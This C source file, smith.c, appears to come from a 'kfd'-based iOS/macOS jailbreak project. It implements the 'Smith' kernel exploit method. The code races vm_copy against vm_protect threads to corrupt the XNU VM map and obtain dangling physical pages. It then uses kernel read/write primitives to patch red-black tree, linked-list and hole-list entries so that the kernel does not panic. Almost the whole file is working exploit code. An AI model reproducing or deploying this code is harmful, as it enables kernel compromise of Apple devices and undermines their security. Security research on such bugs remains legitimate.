//
//  smith.c
//  Bootstrap
//
//  Created by Chris Coding on 1/5/24.
//

#include <stdio.h>
#include "smith.h"

/*
 * This boolean parameter determines whether the vm_map_lock() is taken from
 * another thread before attempting to clean up the VM map in the main thread.
 */
const bool take_vm_map_lock = true;


void smith_init(struct kfd* kfd)
{
    kfd->puaf.puaf_method_data_size = sizeof(struct smith_data);
    kfd->puaf.puaf_method_data = malloc_bzero(kfd->puaf.puaf_method_data_size);

    smith_helper_init(kfd);
}

void smith_run(struct kfd* kfd)
{
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);

    /*
     * STEP 1:
     */
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[2].address, smith->vme[2].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[1].address, smith->vme[1].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[0].address, smith->vme[0].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[3].address, smith->vme[3].size, VM_FLAGS_FIXED | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[4].address, smith->vme[4].size, VM_FLAGS_FIXED | VM_FLAGS_PURGABLE));

    /*
     * STEP 2:
     *
     * Note that vm_copy() in the main thread corresponds to substep 2A in the write-up
     * and vm_protect() in the spawned threads corresponds to substep 2B.
     */
    const uint64_t number_of_spinner_pthreads = 4;
    pthread_t spinner_pthreads[number_of_spinner_pthreads] = {};

    for (uint64_t i = 0; i < number_of_spinner_pthreads; i++) {
        assert_bsd(pthread_create(&spinner_pthreads[i], NULL, smith_helper_spinner_pthread, kfd));
    }

    while (atomic_load(&smith->started_spinner_pthreads) != number_of_spinner_pthreads) {
        usleep(10);
    }

    assert(vm_copy(mach_task_self(), smith->vme[2].address, (0ull - smith->vme[2].address - 1), 0) == KERN_PROTECTION_FAILURE);
    atomic_store(&smith->main_thread_returned, true);

    for (uint64_t i = 0; i < number_of_spinner_pthreads; i++) {
        /*
         * I am not sure if joining the spinner threads here will cause the
         * deallocation of their stack in the VM map. I have never ran into
         * panics because of this, but it is something to keep in mind.
         * Otherwise, if it becomes a problem, we can simply make those spinner
         * threads sleep in a loop until the main thread sends them a signal
         * that the cleanup is finished.
         */
        assert_bsd(pthread_join(spinner_pthreads[i], NULL));
    }

    /*
     * STEP 3:
     */
    assert_mach(vm_copy(mach_task_self(), smith->vme[3].address, smith->vme[3].size, smith->vme[1].address));
    memset((void*)(smith->vme[1].address), 'A', smith->vme[1].size);

    /*
     * STEP 4:
     */
    assert_mach(vm_protect(mach_task_self(), smith->vme[1].address, smith->vme[3].size, false, VM_PROT_DEFAULT));

    /*
     * STEP 5:
     */
    assert_mach(vm_copy(mach_task_self(), smith->vme[4].address, smith->vme[4].size, smith->vme[0].address));

    for (uint64_t i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        kfd->puaf.puaf_pages_uaddr[i] = smith->vme[1].address + pages(i);
    }
}

void smith_cleanup(struct kfd* kfd)
{
    smith_helper_cleanup(kfd);

    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    uint64_t kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    uint64_t kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    uint64_t min_puaf_page_uaddr = min(kread_page_uaddr, kwrite_page_uaddr);
    uint64_t max_puaf_page_uaddr = max(kread_page_uaddr, kwrite_page_uaddr);

    vm_address_t address1 = smith->vme[0].address;
    vm_size_t size1 = smith->vme[0].size + (min_puaf_page_uaddr - smith->vme[1].address);
    assert_mach(vm_deallocate(mach_task_self(), address1, size1));

    vm_address_t address2 = max_puaf_page_uaddr + pages(1);
    vm_size_t size2 = (smith->vme[2].address - address2) + smith->vme[2].size + smith->vme[3].size + smith->vme[4].size;
    assert_mach(vm_deallocate(mach_task_self(), address2, size2));

    /*
     * No middle block if the kread and kwrite pages are the same or back-to-back.
     */
    if ((max_puaf_page_uaddr - min_puaf_page_uaddr) > pages(1)) {
        vm_address_t address3 = min_puaf_page_uaddr + pages(1);
        vm_size_t size3 = (max_puaf_page_uaddr - address3);
        assert_mach(vm_deallocate(mach_task_self(), address3, size3));
    }
}

void smith_free(struct kfd* kfd)
{
    uint64_t kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    uint64_t kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr, pages(1)));
    if (kwrite_page_uaddr != kread_page_uaddr) {
        assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr, pages(1)));
    }
}

void smith_helper_init(struct kfd* kfd)
{
    const uint64_t target_hole_size = pages(0);
    bool found_target_hole = false;

    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    smith->vme[0].size = pages(1);
    smith->vme[1].size = pages(kfd->puaf.number_of_puaf_pages);
    smith->vme[2].size = pages(1);
    smith->vme[3].size = (smith->vme[1].size + smith->vme[2].size);
    smith->vme[4].size = (smith->vme[0].size + smith->vme[3].size);
    uint64_t smith_total_size = (smith->vme[3].size + smith->vme[4].size + smith->vme[4].size);

    uint64_t min_address, max_address;
    puaf_helper_get_vm_map_min_and_max(&min_address, &max_address);

    /*
     * If the boolean parameter "take_vm_map_lock" is turned on, we spawn the
     * thread running smith_helper_cleanup_pthread() right here. Please see the
     * comment above smith_helper_cleanup_pthread() for more info.
     */
    if (take_vm_map_lock) {
        atomic_store(&smith->cleanup_vme.max_address, max_address);
        assert_bsd(pthread_create(&smith->cleanup_vme.pthread, NULL, smith_helper_cleanup_pthread, kfd));
    }

    vm_address_t address = 0;
    vm_size_t size = 0;
    vm_region_basic_info_data_64_t data = {};
    vm_region_info_t info = (vm_region_info_t)(&data);
    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t port = MACH_PORT_NULL;

    vm_address_t vme0_address = 0;
    vm_address_t prev_vme_end = 0;

    while (true) {
        kern_return_t kret = vm_region_64(mach_task_self(), &address, &size, VM_REGION_BASIC_INFO_64, info, &count, &port);
        if ((kret == KERN_INVALID_ADDRESS) || (address >= max_address)) {
            if (found_target_hole) {
                vm_size_t last_hole_size = max_address - prev_vme_end;
                /*
                 * If "target_hole_size" is zero, we could instead simply set
                 * "vme0_address" to (map->max_offset - smith_total_size),
                 * after making sure that this VA range is not already mapped.
                 */
                if (last_hole_size >= (smith_total_size + pages(1))) {
                    vme0_address = (max_address - smith_total_size);
                }
            }

            break;
        }

        assert(kret == KERN_SUCCESS);

        /*
         * Quick hack: pre-fault code pages to avoid faults during the critical section.
         */
        if (data.protection & VM_PROT_EXECUTE) {
            for (uint64_t page_address = address; page_address < address + size; page_address += pages(1)) {
                uint64_t tmp_value = *(volatile uint64_t*)(page_address);
            }
        }

        vm_address_t hole_address = prev_vme_end;
        vm_size_t hole_size = address - prev_vme_end;

        if (prev_vme_end < min_address) {
            goto next_vm_region;
        }

        if (found_target_hole) {
            if (hole_size >= (smith_total_size + pages(1))) {
                vme0_address = (address - smith_total_size);
            }
        } else {
            if (hole_size >= target_hole_size) {
                found_target_hole = true;
            } else if (hole_size > 0) {
                assert_mach(vm_allocate(mach_task_self(), &hole_address, hole_size, VM_FLAGS_FIXED));
            }
        }

next_vm_region:
        address += size;
        size = 0;
        prev_vme_end = address;
    }

    assert(found_target_hole);

    smith->vme[0].address = vme0_address;
    smith->vme[1].address = smith->vme[0].address + smith->vme[0].size;
    smith->vme[2].address = smith->vme[1].address + smith->vme[1].size;
    smith->vme[3].address = smith->vme[2].address + smith->vme[2].size;
    smith->vme[4].address = smith->vme[3].address + smith->vme[3].size;
}

void* smith_helper_spinner_pthread(void* arg)
{
    struct kfd* kfd = (struct kfd*)(arg);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);

    atomic_fetch_add(&smith->started_spinner_pthreads, 1);

    while (!atomic_load(&smith->main_thread_returned)) {
        kern_return_t kret = vm_protect(mach_task_self(), 0, pages(1), false, VM_PROT_WRITE);
        assert((kret == KERN_SUCCESS) || (kret == KERN_INVALID_ADDRESS));
    }

    return NULL;
}

void* smith_helper_cleanup_pthread(void* arg)
{
    struct kfd* kfd = (struct kfd*)(arg);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    vm_address_t max_address = atomic_load(&smith->cleanup_vme.max_address);
    vm_address_t cleanup_vme_end = 0;

    while (!atomic_load(&smith->cleanup_vme.should_start)) {
        usleep(1000);
    }

    do {
        /*
         * Find the last entry with vme_end smaller than the map's max_offset,
         * with a right child that is not null, but not the entry we are going to leak.
         */
        uint64_t map_kaddr = kfd->info.kaddr.current_map;
        uint64_t entry_kaddr = static_kget(struct _vm_map, hdr.links.prev, map_kaddr);

        while (true) {
            uint64_t entry_prev = static_kget(struct vm_map_entry, links.prev, entry_kaddr);
            uint64_t entry_start = static_kget(struct vm_map_entry, links.start, entry_kaddr);
            uint64_t entry_end = static_kget(struct vm_map_entry, links.end, entry_kaddr);
            uint64_t entry_right = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);

            if ((entry_end < max_address) && (entry_right != 0) && (entry_start != 0)) {
                /*
                 * Patch the entry to have its right child point to itself.
                 */
                atomic_store(&smith->cleanup_vme.kaddr, entry_kaddr);
                atomic_store(&smith->cleanup_vme.right, entry_right);
                static_kset(struct vm_map_entry, store.entry.rbe_right, store_for_vme(entry_kaddr), entry_kaddr);
                cleanup_vme_end = entry_end;
                break;
            }

            entry_kaddr = entry_prev;
        }
    } while (0);

    atomic_store(&smith->cleanup_vme.did_start, true);
    vm_protect(mach_task_self(), cleanup_vme_end, pages(1), false, VM_PROT_ALL);
    return NULL;
}

void smith_helper_cleanup(struct kfd* kfd)
{
    assert(kfd->info.kaddr.current_map);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);

    if (take_vm_map_lock) {
        atomic_store(&smith->cleanup_vme.should_start, true);
        while (!atomic_load(&smith->cleanup_vme.did_start)) {
            usleep(10);
        }

        /*
         * Sleep an extra 100 us to make sure smith_helper_cleanup_pthread()
         * had the time to take the vm_map_lock().
         */
        usleep(100);
    }

    uint64_t map_kaddr = kfd->info.kaddr.current_map;

    do {
        /*
         * Scan map entries: we use the kread primitive to loop through every
         * map entries in our VM map, and record the information that we need to
         * patch things up below. There are some assertions along the way to
         * make sure the state of the VM map is corrupted as expected.
         */
        uint64_t entry_count = 0;
        uint64_t entry_kaddr = static_kget(struct _vm_map, hdr.links.next, map_kaddr);
        uint64_t map_entry_kaddr = map_kaddr + offsetof(struct _vm_map, hdr.links.prev);
        uint64_t first_vme_kaddr = 0;
        uint64_t first_vme_parent_store = 0;
        uint64_t second_vme_kaddr = 0;
        uint64_t second_vme_left_store = 0;
        uint64_t vme_end0_kaddr = 0;
        uint64_t vme_end0_start = 0;
        uint64_t leaked_entry_right_store = 0;
        uint64_t leaked_entry_parent_store = 0;
        uint64_t leaked_entry_prev = 0;
        uint64_t leaked_entry_next = 0;
        uint64_t leaked_entry_end = 0;

        while (entry_kaddr != map_entry_kaddr) {
            entry_count++;
            uint64_t entry_next = static_kget(struct vm_map_entry, links.next, entry_kaddr);
            uint64_t entry_start = static_kget(struct vm_map_entry, links.start, entry_kaddr);
            uint64_t entry_end = static_kget(struct vm_map_entry, links.end, entry_kaddr);

            if (entry_count == 1) {
                first_vme_kaddr = entry_kaddr;
                first_vme_parent_store = static_kget(struct vm_map_entry, store.entry.rbe_parent, entry_kaddr);
                uint64_t first_vme_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
                uint64_t first_vme_right_store = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);
                assert(first_vme_left_store == 0);
                assert(first_vme_right_store == 0);
            } else if (entry_count == 2) {
                second_vme_kaddr = entry_kaddr;
                second_vme_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
            } else if (entry_end == 0) {
                vme_end0_kaddr = entry_kaddr;
                vme_end0_start = entry_start;
                assert(vme_end0_start == smith->vme[1].address);
            } else if (entry_start == 0) {
                assert(entry_kaddr == vme_for_store(first_vme_parent_store));
                assert(entry_kaddr == vme_for_store(second_vme_left_store));
                uint64_t leaked_entry_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
                leaked_entry_right_store = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);
                leaked_entry_parent_store = static_kget(struct vm_map_entry, store.entry.rbe_parent, entry_kaddr);
                assert(leaked_entry_left_store == 0);
                assert(vme_for_store(leaked_entry_right_store) == first_vme_kaddr);
                assert(vme_for_store(leaked_entry_parent_store) == second_vme_kaddr);
                leaked_entry_prev = static_kget(struct vm_map_entry, links.prev, entry_kaddr);
                leaked_entry_next = entry_next;
                leaked_entry_end = entry_end;
                assert(leaked_entry_end == smith->vme[3].address);
            }

            entry_kaddr = entry_next;
        }

        /*
         * Patch the doubly-linked list.
         *
         * We leak "vme2b" from the doubly-linked list, as explained in the write-up.
         */
        static_kset(struct vm_map_entry, links.next, leaked_entry_next, leaked_entry_prev);
        static_kset(struct vm_map_entry, links.prev, leaked_entry_prev, leaked_entry_next);

        /*
         * Patch "vme2->vme_end".
         *
         * The kwrite() call is just a workaround if the kwrite primitive cannot
         * overwrite 0. Otherwise, the first 4 lines can be omitted.
         */
        uint64_t vme_end0_start_and_next[2] = { vme_end0_start, (-1) };
        uint64_t unaligned_kaddr = vme_end0_kaddr + offsetof(struct vm_map_entry, links.start) + 1;
        uint64_t unaligned_uaddr = (uint64_t)(&vme_end0_start_and_next) + 1;
        kwrite((uint64_t)(kfd), (void*)(unaligned_uaddr), unaligned_kaddr, sizeof(uint64_t));
        static_kset(struct vm_map_entry, links.end, leaked_entry_end, vme_end0_kaddr);

        /*
         * Patch the red-black tree.
         *
         * We leak "vme2b" from the red-black tree, as explained in the write-up.
         */
        static_kset(struct vm_map_entry, store.entry.rbe_parent, leaked_entry_parent_store, vme_for_store(leaked_entry_right_store));
        static_kset(struct vm_map_entry, store.entry.rbe_left, leaked_entry_right_store, vme_for_store(leaked_entry_parent_store));

        /*
         * Patch map->hdr.nentries.
         *
         * I believe this is not strictly necessary to prevent a kernel panic
         * when the process exits, but I like to patch it just in case.
         */
        uint64_t nentries_buffer = static_kget(struct _vm_map, hdr.nentries, map_kaddr);
        int32_t old_nentries = *(int32_t*)(&nentries_buffer);
        *(int32_t*)(&nentries_buffer) = (old_nentries - 1);
        static_kset(struct _vm_map, hdr.nentries, nentries_buffer, map_kaddr);

        /*
         * Patch map->hint.
         *
         * We set map->hint to point to vm_map_to_entry(map), which effectively
         * means there is no valid hint.
         */
        static_kset(struct _vm_map, hint, map_entry_kaddr, map_kaddr);
    } while (0);

    do {
        /*
         * Scan hole list: we use the kread primitive to loop through every hole
         * entry in our VM map's hole list, and record the information that we
         * need to patch things up below. Once again, there are some assertions
         * along the way to make sure the state is corrupted as expected.
         */
        uint64_t hole_count = 0;
        uint64_t hole_kaddr = static_kget(struct _vm_map, f_s._holes, map_kaddr);
        uint64_t first_hole_kaddr = hole_kaddr;
        uint64_t prev_hole_end = 0;
        uint64_t first_leaked_hole_prev = 0;
        uint64_t first_leaked_hole_next = 0;
        uint64_t first_leaked_hole_end = 0;
        uint64_t second_leaked_hole_prev = 0;
        uint64_t second_leaked_hole_next = 0;

        while (true) {
            hole_count++;
            uint64_t hole_next = static_kget(struct vm_map_entry, links.next, hole_kaddr);
            uint64_t hole_start = static_kget(struct vm_map_entry, links.start, hole_kaddr);
            uint64_t hole_end = static_kget(struct vm_map_entry, links.end, hole_kaddr);

            if (hole_start == 0) {
                first_leaked_hole_prev = static_kget(struct vm_map_entry, links.prev, hole_kaddr);
                first_leaked_hole_next = hole_next;
                first_leaked_hole_end = hole_end;
                assert(prev_hole_end == smith->vme[1].address);
            } else if (hole_start == smith->vme[1].address) {
                second_leaked_hole_prev = static_kget(struct vm_map_entry, links.prev, hole_kaddr);
                second_leaked_hole_next = hole_next;
                assert(hole_end == smith->vme[2].address);
            }

            hole_kaddr = hole_next;
            prev_hole_end = hole_end;
            if (hole_kaddr == first_hole_kaddr) {
                break;
            }
        }

        /*
         * Patch the hole entries.
         *
         * We patch the end address of the first hole and we leak the two extra
         * holes, as explained in the write-up.
         */
        static_kset(struct vm_map_entry, links.end, first_leaked_hole_end, first_leaked_hole_prev);
        static_kset(struct vm_map_entry, links.next, first_leaked_hole_next, first_leaked_hole_prev);
        static_kset(struct vm_map_entry, links.prev, first_leaked_hole_prev, first_leaked_hole_next);
        static_kset(struct vm_map_entry, links.next, second_leaked_hole_next, second_leaked_hole_prev);
        static_kset(struct vm_map_entry, links.prev, second_leaked_hole_prev, second_leaked_hole_next);

        /*
         * Patch map->hole_hint.
         *
         * We set map->hole_hint to point to the first hole, which is guaranteed
         * to not be one of the two holes that we just leaked.
         */
        static_kset(struct _vm_map, vmmap_u_1.vmmap_hole_hint, first_hole_kaddr, map_kaddr);
    } while (0);

    if (take_vm_map_lock) {
        /*
         * Restore the entry to have its right child point to its original value.
         */
        uint64_t entry_kaddr = atomic_load(&smith->cleanup_vme.kaddr);
        uint64_t entry_right = atomic_load(&smith->cleanup_vme.right);
        static_kset(struct vm_map_entry, store.entry.rbe_right, entry_right, entry_kaddr);
        assert_bsd(pthread_join(smith->cleanup_vme.pthread, NULL));
    }
}

